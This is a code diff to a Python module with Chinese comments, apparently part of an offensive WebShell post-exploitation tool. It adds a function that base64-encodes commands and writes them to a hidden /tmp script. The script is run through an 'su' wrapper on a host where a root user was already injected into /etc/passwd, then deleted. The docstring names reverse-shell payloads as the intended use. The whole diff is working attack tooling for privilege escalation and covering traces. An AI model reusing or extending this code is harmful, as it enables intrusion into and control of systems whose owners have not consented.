@@ -19,12 +19,46 @@ def apply_cmd_wrapper(cmd: str, wrapper: str) -> str:
     WebShell 是无状态的一次性执行，往 /etc/passwd 里加了 root 用户也不会让会话
     本身变成 root。因此验证拿到 root 后，把后续每条命令套进
     `script -qc "su <user> -c %CMD%" /dev/null` 之类的包装器执行。
+
+    ⚠ 注意 %CMD% 常处在模板的**双引号内**，而 shlex.quote 对含单引号的命令会生成
+    `'"'"'`（内含双引号）→ 会提前终止模板的引号把命令撕碎。
+    需要下发复杂命令时请改用 `wrap_privileged_cmd()`（落盘后执行），不要直接调本函数。
     """
     if not wrapper or "%CMD%" not in wrapper:
         return cmd
     import shlex
 
     return wrapper.replace("%CMD%", shlex.quote(cmd))
+
+
+def wrap_privileged_cmd(cmd: str, wrapper: str, path: str = "",
+                        platform: str = "linux") -> str:
+    """把提权命令**安全地**交给包裹器执行（规避「模板引号 × shlex.quote」冲突）。
+
+    背景：包裹器模板形如 `script -qc "su ph -c %CMD%" /dev/null`，`%CMD%` 位于双引号内。
+    若直接把命令 shlex.quote 后内联，命令里的单引号会让 shlex 产出 `'"'"'`，
+    其中那个双引号会提前结束模板的引号 → 命令被截断，目标侧报
+    `Bad fd number` / `script: cannot open ...`（反弹 Shell 载荷必含单引号，必中）。
+
+    做法：先把命令 base64 落到目标临时文件，再让包裹器执行 `sh <文件>`。
+    此时 %CMD% 只是 `sh /tmp/xxx.sh`（无引号风险），命令本体不再被任何一层 shell 重新解析。
+
+    - wrapper 为空 / 不含 %CMD% → 原样返回 cmd（保持既有行为，零开销）
+    - Windows 目标无 /bin/sh 与 base64 -d → 维持内联（模板通常是 runas/PowerShell 形态）
+    """
+    if not wrapper or "%CMD%" not in wrapper:
+        return cmd
+    if platform == "windows":
+        return apply_cmd_wrapper(cmd, wrapper)
+
+    import base64 as _b64
+    import secrets as _sec
+
+    script = path or "/tmp/.pivothub_%s.sh" % _sec.token_hex(6)
+    b64 = _b64.b64encode(cmd.encode("utf-8")).decode("ascii")
+    inner = apply_cmd_wrapper("sh %s" % script, wrapper)
+    # 落盘成功才执行；执行完顺手删掉脚本（后台任务已 fork，不受影响）
+    return "echo %s | base64 -d > %s && %s; rm -f %s" % (b64, script, inner, script)
 
 
 @dataclass
